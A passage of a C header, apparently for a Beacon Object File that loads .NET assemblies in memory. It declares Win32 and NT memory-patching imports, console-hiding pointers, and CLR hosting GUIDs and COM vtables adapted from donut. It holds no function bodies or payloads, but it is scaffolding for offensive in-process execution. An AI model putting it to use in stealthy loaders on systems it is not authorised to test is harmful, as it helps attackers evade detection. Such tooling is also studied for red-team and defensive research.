WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateMailslotA(LPCSTR lpName, DWORD nMaxMessageSize, DWORD lReadTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);

WINBASEAPI BOOL WINAPI KERNEL32$GetMailslotInfo(HANDLE  hMailslot, LPDWORD lpMaxMessageSize, LPDWORD lpNextSize, LPDWORD lpMessageCount, LPDWORD lpReadTimeout);

WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);

DECLSPEC_IMPORT HGLOBAL KERNEL32$GlobalAlloc(UINT uFlags, SIZE_T dwBytes);

DECLSPEC_IMPORT HGLOBAL KERNEL32$GlobalFree(HGLOBAL hMem);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect (PVOID, DWORD, DWORD, PDWORD);

//SHELL32

WINBASEAPI LPWSTR* WINAPI SHELL32$CommandLineToArgvW(LPCWSTR lpCmdLine, int* pNumArgs);

//MSCOREE

WINBASEAPI HRESULT WINAPI MSCOREE$CLRCreateInstance(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

//OLEAUT32

WINBASEAPI SAFEARRAY* WINAPI OLEAUT32$SafeArrayCreateVector(VARTYPE vt, LONG lLbound, ULONG   cElements);

WINBASEAPI SAFEARRAY* WINAPI OLEAUT32$SafeArrayCreate(VARTYPE vt, UINT cDims, SAFEARRAYBOUND* rgsabound);

WINBASEAPI HRESULT WINAPI OLEAUT32$SafeArrayAccessData(SAFEARRAY* psa, void HUGEP** ppvData);

WINBASEAPI HRESULT WINAPI OLEAUT32$SafeArrayUnaccessData(SAFEARRAY* psa);

WINBASEAPI HRESULT WINAPI OLEAUT32$SafeArrayPutElement(SAFEARRAY* psa, LONG* rgIndices, void* pv);

WINBASEAPI HRESULT WINAPI OLEAUT32$SafeArrayDestroy(SAFEARRAY* psa);

WINBASEAPI HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG* pvarg);

WINBASEAPI BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR* psz);



#define intZeroMemory(addr,size) memset((addr),0,size)

#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)

#define memset MSVCRT$memset

#define stdout (__acrt_iob_func(1))

#define STATUS_SUCCESS 0

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )



/*GetProcAddess Pointers*/

typedef DWORD (WINAPI* _GetCurrentProcessId) (void);

typedef BOOL (WINAPI* _AttachConsole) (DWORD dwProcessId);

typedef BOOL (WINAPI* _AllocConsole) (void);

typedef HWND (WINAPI* _GetConsoleWindow) (void);

typedef BOOL (WINAPI* _ShowWindow) (HWND hWnd, int nCmdShow);

typedef BOOL (WINAPI* _FreeConsole) (void);

typedef BOOL (WINAPI* _SetStdHandle) (DWORD nStdHandle, HANDLE hHandle);

typedef HANDLE (WINAPI* _GetStdHandle) (DWORD nStdHandle);

typedef BOOL (WINAPI* _CloseHandle) (HANDLE hObject);

typedef /*_Post_equals_last_error_*/ DWORD (WINAPI* _GetLastError) (void);

typedef int (WINAPI* _WideCharToMultiByte) (UINT CodePage, DWORD dwFlags, /*_In_NLS_string_(cchWideChar)*/LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);

typedef LPVOID (WINAPI* _CoTaskMemAlloc) (SIZE_T cb);

typedef LPVOID (WINAPI* _CoTaskMemFree) (/*_Frees_ptr_opt_*/ LPVOID pv);

typedef HANDLE (WINAPI* _CreateNamedPipeA) (LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);//NtWriteVirtualMemory

typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);//NtProtectVirtualMemory



/*CLR GUIDS, Stucts -> Mostly from https://github.com/TheWover/donut*/

static GUID xIID_AppDomain = {

  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13} };



static GUID xCLSID_CLRMetaHost = {

  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde} };



static GUID xIID_ICLRMetaHost = {

  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16} };



static GUID xIID_ICLRRuntimeInfo = {

  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91} };



static GUID xIID_ICorRuntimeHost = {

  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e} };



static GUID xCLSID_CorRuntimeHost = {

  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e} };





GUID        xIID_IUnknown;

GUID        xIID_IDispatch;



//GUID required to load .NET assemblies

/*GUID        xCLSID_CLRMetaHost;

GUID        xIID_ICLRMetaHost;

GUID        xIID_ICLRRuntimeInfo;

GUID        xCLSID_CorRuntimeHost;

GUID        xIID_ICorRuntimeHost;

GUID        xIID_AppDomain;*/



typedef struct _ICLRMetaHost            ICLRMetaHost;

typedef struct _ICLRRuntimeInfo         ICLRRuntimeInfo;

typedef struct _ICorRuntimeHost         ICorRuntimeHost;

typedef struct _ICorConfiguration       ICorConfiguration;

typedef struct _IGCThreadControl        IGCThreadControl;

typedef struct _IGCHostControl          IGCHostControl;

typedef struct _IDebuggerThreadControl  IDebuggerThreadControl;

typedef struct _AppDomain               IAppDomain;

typedef struct _Assembly                IAssembly;

typedef struct _Type                    IType;

typedef struct _Binder                  IBinder;

typedef struct _MethodInfo              IMethodInfo;



typedef void* HDOMAINENUM;



typedef HRESULT(__stdcall* CLRCreateInstanceFnPtr)(

    REFCLSID clsid,

    REFIID riid,

    LPVOID* ppInterface);



typedef HRESULT(__stdcall* CreateInterfaceFnPtr)(

    REFCLSID clsid,

    REFIID riid,

    LPVOID* ppInterface);





typedef HRESULT(__stdcall* CallbackThreadSetFnPtr)(void);



typedef HRESULT(__stdcall* CallbackThreadUnsetFnPtr)(void);



typedef void(__stdcall* RuntimeLoadedCallbackFnPtr)(

    ICLRRuntimeInfo* pRuntimeInfo,

    CallbackThreadSetFnPtr pfnCallbackThreadSet,

    CallbackThreadUnsetFnPtr pfnCallbackThreadUnset);



#undef DUMMY_METHOD

#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IBinder *This)



typedef struct _BinderVtbl {

    HRESULT(STDMETHODCALLTYPE* QueryInterface)(

        IBinder* This,

        /* [in] */ REFIID riid,

        /* [iid_is][out] */ void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IBinder* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IBinder* This);



    DUMMY_METHOD(GetTypeInfoCount);

    DUMMY_METHOD(GetTypeInfo);

    DUMMY_METHOD(GetIDsOfNames);

    DUMMY_METHOD(Invoke);

    DUMMY_METHOD(ToString);

    DUMMY_METHOD(Equals);

    DUMMY_METHOD(GetHashCode);

    DUMMY_METHOD(GetType);

    DUMMY_METHOD(BindToMethod);

    DUMMY_METHOD(BindToField);

    DUMMY_METHOD(SelectMethod);

    DUMMY_METHOD(SelectProperty);

    DUMMY_METHOD(ChangeType);

    DUMMY_METHOD(ReorderArgumentArray);

} BinderVtbl;



typedef struct _Binder {

    BinderVtbl* lpVtbl;

} Binder;



#undef DUMMY_METHOD

#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IAppDomain *This)



typedef struct _AppDomainVtbl {

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IAppDomain* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */ void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IAppDomain* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IAppDomain* This);



    DUMMY_METHOD(GetTypeInfoCount);

    DUMMY_METHOD(GetTypeInfo);

    DUMMY_METHOD(GetIDsOfNames);

    DUMMY_METHOD(Invoke);



    DUMMY_METHOD(ToString);

    DUMMY_METHOD(Equals);

    DUMMY_METHOD(GetHashCode);

    DUMMY_METHOD(GetType);

    DUMMY_METHOD(InitializeLifetimeService);

    DUMMY_METHOD(GetLifetimeService);

    DUMMY_METHOD(Evidence);

    DUMMY_METHOD(add_DomainUnload);

    DUMMY_METHOD(remove_DomainUnload);

    DUMMY_METHOD(add_AssemblyLoad);

    DUMMY_METHOD(remove_AssemblyLoad);

    DUMMY_METHOD(add_ProcessExit);

    DUMMY_METHOD(remove_ProcessExit);

    DUMMY_METHOD(add_TypeResolve);

    DUMMY_METHOD(remove_TypeResolve);

    DUMMY_METHOD(add_ResourceResolve);

    DUMMY_METHOD(remove_ResourceResolve);

    DUMMY_METHOD(add_AssemblyResolve);

    DUMMY_METHOD(remove_AssemblyResolve);

    DUMMY_METHOD(add_UnhandledException);

    DUMMY_METHOD(remove_UnhandledException);

    DUMMY_METHOD(DefineDynamicAssembly);

    DUMMY_METHOD(DefineDynamicAssembly_2);

    DUMMY_METHOD(DefineDynamicAssembly_3);

    DUMMY_METHOD(DefineDynamicAssembly_4);

    DUMMY_METHOD(DefineDynamicAssembly_5);

    DUMMY_METHOD(DefineDynamicAssembly_6);

    DUMMY_METHOD(DefineDynamicAssembly_7);

    DUMMY_METHOD(DefineDynamicAssembly_8);

    DUMMY_METHOD(DefineDynamicAssembly_9);

    DUMMY_METHOD(CreateInstance);

    DUMMY_METHOD(CreateInstanceFrom);

    DUMMY_METHOD(CreateInstance_2);

    DUMMY_METHOD(CreateInstanceFrom_2);

    DUMMY_METHOD(CreateInstance_3);

    DUMMY_METHOD(CreateInstanceFrom_3);

    DUMMY_METHOD(Load);

    DUMMY_METHOD(Load_2);



    HRESULT(STDMETHODCALLTYPE* Load_3)(

        IAppDomain* This,

        SAFEARRAY* rawAssembly,

        IAssembly** pRetVal);



    DUMMY_METHOD(Load_4);

    DUMMY_METHOD(Load_5);

    DUMMY_METHOD(Load_6);

    DUMMY_METHOD(Load_7);

    DUMMY_METHOD(ExecuteAssembly);

    DUMMY_METHOD(ExecuteAssembly_2);

    DUMMY_METHOD(ExecuteAssembly_3);

    DUMMY_METHOD(FriendlyName);

    DUMMY_METHOD(BaseDirectory);

    DUMMY_METHOD(RelativeSearchPath);

    DUMMY_METHOD(ShadowCopyFiles);

    DUMMY_METHOD(GetAssemblies);

    DUMMY_METHOD(AppendPrivatePath);

    DUMMY_METHOD(ClearPrivatePath);

    DUMMY_METHOD(SetShadowCopyPath);

    DUMMY_METHOD(ClearShadowCopyPath);

    DUMMY_METHOD(SetCachePath);

    DUMMY_METHOD(SetData);

    DUMMY_METHOD(GetData);

    DUMMY_METHOD(SetAppDomainPolicy);

    DUMMY_METHOD(SetThreadPrincipal);

    DUMMY_METHOD(SetPrincipalPolicy);

    DUMMY_METHOD(DoCallBack);

    DUMMY_METHOD(DynamicDirectory);



    END_INTERFACE

} AppDomainVtbl;



typedef struct _AppDomain {

    AppDomainVtbl* lpVtbl;

} AppDomain;



#undef DUMMY_METHOD

#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IAssembly *This)



typedef struct _AssemblyVtbl {

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IAssembly* This,

            REFIID riid,

            void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IAssembly* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IAssembly* This);



    DUMMY_METHOD(GetTypeInfoCount);

    DUMMY_METHOD(GetTypeInfo);

    DUMMY_METHOD(GetIDsOfNames);



    DUMMY_METHOD(Invoke);

    DUMMY_METHOD(ToString);

    DUMMY_METHOD(Equals);

    DUMMY_METHOD(GetHashCode);

    DUMMY_METHOD(GetType);

    DUMMY_METHOD(CodeBase);

    DUMMY_METHOD(EscapedCodeBase);

    DUMMY_METHOD(GetName);

    DUMMY_METHOD(GetName_2);

    DUMMY_METHOD(FullName);



    HRESULT(STDMETHODCALLTYPE* EntryPoint)(

        IAssembly* This,

        IMethodInfo** pRetVal);



    HRESULT(STDMETHODCALLTYPE* GetType_2)(

        IAssembly* This,

        BSTR        name,

        IType** pRetVal);



    DUMMY_METHOD(GetType_3);

    DUMMY_METHOD(GetExportedTypes);

    DUMMY_METHOD(GetTypes);

    DUMMY_METHOD(GetManifestResourceStream);

    DUMMY_METHOD(GetManifestResourceStream_2);

    DUMMY_METHOD(GetFile);

    DUMMY_METHOD(GetFiles);

    DUMMY_METHOD(GetFiles_2);

    DUMMY_METHOD(GetManifestResourceNames);

    DUMMY_METHOD(GetManifestResourceInfo);

    DUMMY_METHOD(Location);

    DUMMY_METHOD(Evidence);

    DUMMY_METHOD(GetCustomAttributes);

    DUMMY_METHOD(GetCustomAttributes_2);

    DUMMY_METHOD(IsDefined);

    DUMMY_METHOD(GetObjectData);

    DUMMY_METHOD(add_ModuleResolve);

    DUMMY_METHOD(remove_ModuleResolve);

    DUMMY_METHOD(GetType_4);

    DUMMY_METHOD(GetSatelliteAssembly);

    DUMMY_METHOD(GetSatelliteAssembly_2);

    DUMMY_METHOD(LoadModule);

    DUMMY_METHOD(LoadModule_2);

    DUMMY_METHOD(CreateInstance);

    DUMMY_METHOD(CreateInstance_2);

    DUMMY_METHOD(CreateInstance_3);

    DUMMY_METHOD(GetLoadedModules);

    DUMMY_METHOD(GetLoadedModules_2);

    DUMMY_METHOD(GetModules);

    DUMMY_METHOD(GetModules_2);

    DUMMY_METHOD(GetModule);

    DUMMY_METHOD(GetReferencedAssemblies);

    DUMMY_METHOD(GlobalAssemblyCache);



    END_INTERFACE

} AssemblyVtbl;



typedef enum _BindingFlags {

    BindingFlags_Default = 0,

    BindingFlags_IgnoreCase = 1,

    BindingFlags_DeclaredOnly = 2,

    BindingFlags_Instance = 4,

    BindingFlags_Static = 8,

    BindingFlags_Public = 16,

    BindingFlags_NonPublic = 32,

    BindingFlags_FlattenHierarchy = 64,

    BindingFlags_InvokeMethod = 256,

    BindingFlags_CreateInstance = 512,

    BindingFlags_GetField = 1024,

    BindingFlags_SetField = 2048,

    BindingFlags_GetProperty = 4096,

    BindingFlags_SetProperty = 8192,

    BindingFlags_PutDispProperty = 16384,

    BindingFlags_PutRefDispProperty = 32768,

    BindingFlags_ExactBinding = 65536,

    BindingFlags_SuppressChangeType = 131072,

    BindingFlags_OptionalParamBinding = 262144,

    BindingFlags_IgnoreReturn = 16777216

} BindingFlags;



typedef struct _Assembly {

    AssemblyVtbl* lpVtbl;

} Assembly;



#undef DUMMY_METHOD

#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IType *This)



typedef struct _TypeVtbl {

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IType* This,

            REFIID riid,

            void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IType* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IType* This);



    DUMMY_METHOD(GetTypeInfoCount);

    DUMMY_METHOD(GetTypeInfo);

    DUMMY_METHOD(GetIDsOfNames);

    DUMMY_METHOD(Invoke);



    DUMMY_METHOD(ToString);

    DUMMY_METHOD(Equals);

    DUMMY_METHOD(GetHashCode);

    DUMMY_METHOD(GetType);

    DUMMY_METHOD(MemberType);

    DUMMY_METHOD(name);

    DUMMY_METHOD(DeclaringType);

    DUMMY_METHOD(ReflectedType);

    DUMMY_METHOD(GetCustomAttributes);

    DUMMY_METHOD(GetCustomAttributes_2);

    DUMMY_METHOD(IsDefined);

    DUMMY_METHOD(Guid);

    DUMMY_METHOD(Module);

    DUMMY_METHOD(Assembly);

    DUMMY_METHOD(TypeHandle);

    DUMMY_METHOD(FullName);

    DUMMY_METHOD(Namespace);

    DUMMY_METHOD(AssemblyQualifiedName);

    DUMMY_METHOD(GetArrayRank);

    DUMMY_METHOD(BaseType);

    DUMMY_METHOD(GetConstructors);

    DUMMY_METHOD(GetInterface);

    DUMMY_METHOD(GetInterfaces);

    DUMMY_METHOD(FindInterfaces);

    DUMMY_METHOD(GetEvent);

    DUMMY_METHOD(GetEvents);

    DUMMY_METHOD(GetEvents_2);

    DUMMY_METHOD(GetNestedTypes);

    DUMMY_METHOD(GetNestedType);

    DUMMY_METHOD(GetMember);

    DUMMY_METHOD(GetDefaultMembers);

    DUMMY_METHOD(FindMembers);

    DUMMY_METHOD(GetElementType);

    DUMMY_METHOD(IsSubclassOf);

    DUMMY_METHOD(IsInstanceOfType);

    DUMMY_METHOD(IsAssignableFrom);

    DUMMY_METHOD(GetInterfaceMap);

    DUMMY_METHOD(GetMethod);

    DUMMY_METHOD(GetMethod_2);

    DUMMY_METHOD(GetMethods);

    DUMMY_METHOD(GetField);

    DUMMY_METHOD(GetFields);

    DUMMY_METHOD(GetProperty);

    DUMMY_METHOD(GetProperty_2);

    DUMMY_METHOD(GetProperties);

    DUMMY_METHOD(GetMember_2);

    DUMMY_METHOD(GetMembers);

    DUMMY_METHOD(InvokeMember);

    DUMMY_METHOD(UnderlyingSystemType);

    DUMMY_METHOD(InvokeMember_2);



    HRESULT(STDMETHODCALLTYPE* InvokeMember_3)(

        IType* This,

        BSTR         name,

        BindingFlags invokeAttr,

        IBinder* Binder,

        VARIANT      Target,

        SAFEARRAY* args,

        VARIANT* pRetVal);



    DUMMY_METHOD(GetConstructor);

    DUMMY_METHOD(GetConstructor_2);

    DUMMY_METHOD(GetConstructor_3);

    DUMMY_METHOD(GetConstructors_2);

    DUMMY_METHOD(TypeInitializer);

    DUMMY_METHOD(GetMethod_3);

    DUMMY_METHOD(GetMethod_4);

    DUMMY_METHOD(GetMethod_5);

    DUMMY_METHOD(GetMethod_6);

    DUMMY_METHOD(GetMethods_2);

    DUMMY_METHOD(GetField_2);

    DUMMY_METHOD(GetFields_2);

    DUMMY_METHOD(GetInterface_2);

    DUMMY_METHOD(GetEvent_2);

    DUMMY_METHOD(GetProperty_3);

    DUMMY_METHOD(GetProperty_4);

    DUMMY_METHOD(GetProperty_5);

    DUMMY_METHOD(GetProperty_6);

    DUMMY_METHOD(GetProperty_7);

    DUMMY_METHOD(GetProperties_2);

    DUMMY_METHOD(GetNestedTypes_2);

    DUMMY_METHOD(GetNestedType_2);

    DUMMY_METHOD(GetMember_3);

    DUMMY_METHOD(GetMembers_2);

    DUMMY_METHOD(Attributes);

    DUMMY_METHOD(IsNotPublic);

    DUMMY_METHOD(IsPublic);

    DUMMY_METHOD(IsNestedPublic);

    DUMMY_METHOD(IsNestedPrivate);

    DUMMY_METHOD(IsNestedFamily);

    DUMMY_METHOD(IsNestedAssembly);

    DUMMY_METHOD(IsNestedFamANDAssem);

    DUMMY_METHOD(IsNestedFamORAssem);

    DUMMY_METHOD(IsAutoLayout);

    DUMMY_METHOD(IsLayoutSequential);

    DUMMY_METHOD(IsExplicitLayout);

    DUMMY_METHOD(IsClass);

    DUMMY_METHOD(IsInterface);

    DUMMY_METHOD(IsValueType);

    DUMMY_METHOD(IsAbstract);

    DUMMY_METHOD(IsSealed);

    DUMMY_METHOD(IsEnum);

    DUMMY_METHOD(IsSpecialName);

    DUMMY_METHOD(IsImport);

    DUMMY_METHOD(IsSerializable);

    DUMMY_METHOD(IsAnsiClass);

    DUMMY_METHOD(IsUnicodeClass);

    DUMMY_METHOD(IsAutoClass);

    DUMMY_METHOD(IsArray);

    DUMMY_METHOD(IsByRef);

    DUMMY_METHOD(IsPointer);

    DUMMY_METHOD(IsPrimitive);

    DUMMY_METHOD(IsCOMObject);

    DUMMY_METHOD(HasElementType);

    DUMMY_METHOD(IsContextful);

    DUMMY_METHOD(IsMarshalByRef);

    DUMMY_METHOD(Equals_2);



    END_INTERFACE

} TypeVtbl;



typedef struct ICLRRuntimeInfoVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            ICLRRuntimeInfo* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        ICLRRuntimeInfo* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        ICLRRuntimeInfo* This);



    HRESULT(STDMETHODCALLTYPE* GetVersionString)(

        ICLRRuntimeInfo* This,

        /* [size_is][out] */

        /*__out_ecount_full_opt(*pcchBuffer)*/  LPWSTR pwzBuffer,

        /* [out][in] */ DWORD* pcchBuffer);



    HRESULT(STDMETHODCALLTYPE* GetRuntimeDirectory)(

        ICLRRuntimeInfo* This,

        /* [size_is][out] */

        /*__out_ecount_full(*pcchBuffer)*/  LPWSTR pwzBuffer,

        /* [out][in] */ DWORD* pcchBuffer);



    HRESULT(STDMETHODCALLTYPE* IsLoaded)(

        ICLRRuntimeInfo* This,

        /* [in] */ HANDLE hndProcess,

        /* [retval][out] */ BOOL* pbLoaded);



    HRESULT(STDMETHODCALLTYPE* LoadErrorString)(

        ICLRRuntimeInfo* This,

        /* [in] */ UINT iResourceID,

        /* [size_is][out] */

        /*__out_ecount_full(*pcchBuffer)*/  LPWSTR pwzBuffer,

        /* [out][in] */ DWORD* pcchBuffer,

        /* [lcid][in] */ LONG iLocaleID);



    HRESULT(STDMETHODCALLTYPE* LoadLibrary)(

        ICLRRuntimeInfo* This,

        /* [in] */ LPCWSTR pwzDllName,

        /* [retval][out] */ HMODULE* phndModule);



    HRESULT(STDMETHODCALLTYPE* GetProcAddress)(

        ICLRRuntimeInfo* This,

        /* [in] */ LPCSTR pszProcName,

        /* [retval][out] */ LPVOID* ppProc);



    HRESULT(STDMETHODCALLTYPE* GetInterface)(

        ICLRRuntimeInfo* This,

        /* [in] */ REFCLSID rclsid,

        /* [in] */ REFIID riid,

        /* [retval][iid_is][out] */ LPVOID* ppUnk);



    HRESULT(STDMETHODCALLTYPE* IsLoadable)(

        ICLRRuntimeInfo* This,

        /* [retval][out] */ BOOL* pbLoadable);



    HRESULT(STDMETHODCALLTYPE* SetDefaultStartupFlags)(

        ICLRRuntimeInfo* This,

        /* [in] */ DWORD dwStartupFlags,

        /* [in] */ LPCWSTR pwzHostConfigFile);



    HRESULT(STDMETHODCALLTYPE* GetDefaultStartupFlags)(

        ICLRRuntimeInfo* This,

        /* [out] */ DWORD* pdwStartupFlags,

        /* [size_is][out] */

        /*__out_ecount_full_opt(*pcchHostConfigFile)*/  LPWSTR pwzHostConfigFile,

        /* [out][in] */ DWORD* pcchHostConfigFile);



    HRESULT(STDMETHODCALLTYPE* BindAsLegacyV2Runtime)(

        ICLRRuntimeInfo* This);



    HRESULT(STDMETHODCALLTYPE* IsStarted)(

        ICLRRuntimeInfo* This,

        /* [out] */ BOOL* pbStarted,

        /* [out] */ DWORD* pdwStartupFlags);



    END_INTERFACE

} ICLRRuntimeInfoVtbl;



typedef struct _ICLRRuntimeInfo {

    ICLRRuntimeInfoVtbl* lpVtbl;

} ICLRRuntimeInfo;



typedef struct _Type {

    TypeVtbl* lpVtbl;

} Type;



typedef struct ICLRMetaHostVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            ICLRMetaHost* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        ICLRMetaHost* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        ICLRMetaHost* This);



    HRESULT(STDMETHODCALLTYPE* GetRuntime)(

        ICLRMetaHost* This,

        /* [in] */ LPCWSTR pwzVersion,

        /* [in] */ REFIID riid,

        /* [retval][iid_is][out] */ LPVOID* ppRuntime);



    HRESULT(STDMETHODCALLTYPE* GetVersionFromFile)(

        ICLRMetaHost* This,

        /* [in] */ LPCWSTR pwzFilePath,

        /* [size_is][out] */

        /*__out_ecount_full(*pcchBuffer)*/  LPWSTR pwzBuffer,

        /* [out][in] */ DWORD* pcchBuffer);



    HRESULT(STDMETHODCALLTYPE* EnumerateInstalledRuntimes)(

        ICLRMetaHost* This,

        /* [retval][out] */ IEnumUnknown** ppEnumerator);



    HRESULT(STDMETHODCALLTYPE* EnumerateLoadedRuntimes)(

        ICLRMetaHost* This,

        /* [in] */ HANDLE hndProcess,

        /* [retval][out] */ IEnumUnknown** ppEnumerator);



    HRESULT(STDMETHODCALLTYPE* RequestRuntimeLoadedNotification)(

        ICLRMetaHost* This,

        /* [in] */ RuntimeLoadedCallbackFnPtr pCallbackFunction);



    HRESULT(STDMETHODCALLTYPE* QueryLegacyV2RuntimeBinding)(

        ICLRMetaHost* This,

        /* [in] */ REFIID riid,

        /* [retval][iid_is][out] */ LPVOID* ppUnk);



    HRESULT(STDMETHODCALLTYPE* ExitProcess)(

        ICLRMetaHost* This,

        /* [in] */ INT32 iExitCode);



    END_INTERFACE

} ICLRMetaHostVtbl;



typedef struct _ICLRMetaHost

{

    ICLRMetaHostVtbl* lpVtbl;

} ICLRMetaHost;



typedef struct ICorRuntimeHostVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            ICorRuntimeHost* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        ICorRuntimeHost* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        ICorRuntimeHost* This);



    HRESULT(STDMETHODCALLTYPE* CreateLogicalThreadState)(

        ICorRuntimeHost* This);



    HRESULT(STDMETHODCALLTYPE* DeleteLogicalThreadState)(

        ICorRuntimeHost* This);



    HRESULT(STDMETHODCALLTYPE* SwitchInLogicalThreadState)(

        ICorRuntimeHost* This,

        /* [in] */ DWORD* pFiberCookie);



    HRESULT(STDMETHODCALLTYPE* SwitchOutLogicalThreadState)(

        ICorRuntimeHost* This,

        /* [out] */ DWORD** pFiberCookie);



    HRESULT(STDMETHODCALLTYPE* LocksHeldByLogicalThread)(

        ICorRuntimeHost* This,

        /* [out] */ DWORD* pCount);



    HRESULT(STDMETHODCALLTYPE* MapFile)(

        ICorRuntimeHost* This,

        /* [in] */ HANDLE hFile,

        /* [out] */ HMODULE* hMapAddress);



    HRESULT(STDMETHODCALLTYPE* GetConfiguration)(

        ICorRuntimeHost* This,

        /* [out] */ ICorConfiguration* *pConfiguration);



    HRESULT(STDMETHODCALLTYPE* Start)(

        ICorRuntimeHost* This);



    HRESULT(STDMETHODCALLTYPE* Stop)(

        ICorRuntimeHost* This);



    HRESULT(STDMETHODCALLTYPE* CreateDomain)(

        ICorRuntimeHost* This,

        /* [in] */ LPCWSTR pwzFriendlyName,

        /* [in] */ IUnknown* pIdentityArray,

        /* [out] */ IUnknown** pAppDomain);



    HRESULT(STDMETHODCALLTYPE* GetDefaultDomain)(

        ICorRuntimeHost* This,

        /* [out] */ IUnknown** pAppDomain);



    HRESULT(STDMETHODCALLTYPE* EnumDomains)(

        ICorRuntimeHost* This,

        /* [out] */ HDOMAINENUM* hEnum);



    HRESULT(STDMETHODCALLTYPE* NextDomain)(

        ICorRuntimeHost* This,

        /* [in] */ HDOMAINENUM hEnum,

        /* [out] */ IUnknown** pAppDomain);



    HRESULT(STDMETHODCALLTYPE* CloseEnum)(

        ICorRuntimeHost* This,

        /* [in] */ HDOMAINENUM hEnum);



    HRESULT(STDMETHODCALLTYPE* CreateDomainEx)(

        ICorRuntimeHost* This,

        /* [in] */ LPCWSTR pwzFriendlyName,

        /* [in] */ IUnknown* pSetup,

        /* [in] */ IUnknown* pEvidence,

        /* [out] */ IUnknown** pAppDomain);



    HRESULT(STDMETHODCALLTYPE* CreateDomainSetup)(

        ICorRuntimeHost* This,

        /* [out] */ IUnknown** pAppDomainSetup);



    HRESULT(STDMETHODCALLTYPE* CreateEvidence)(

        ICorRuntimeHost* This,

        /* [out] */ IUnknown** pEvidence);



    HRESULT(STDMETHODCALLTYPE* UnloadDomain)(

        ICorRuntimeHost* This,

        /* [in] */ IUnknown* pAppDomain);



    HRESULT(STDMETHODCALLTYPE* CurrentDomain)(

        ICorRuntimeHost* This,

        /* [out] */ IUnknown** pAppDomain);



    END_INTERFACE

} ICorRuntimeHostVtbl;



typedef struct _ICorRuntimeHost {

    ICorRuntimeHostVtbl* lpVtbl;

} ICorRuntimeHost;



#undef DUMMY_METHOD

#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IMethodInfo *This)



typedef struct _MethodInfoVtbl {

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IMethodInfo* This,

            /* [in] */ REFIID riid,

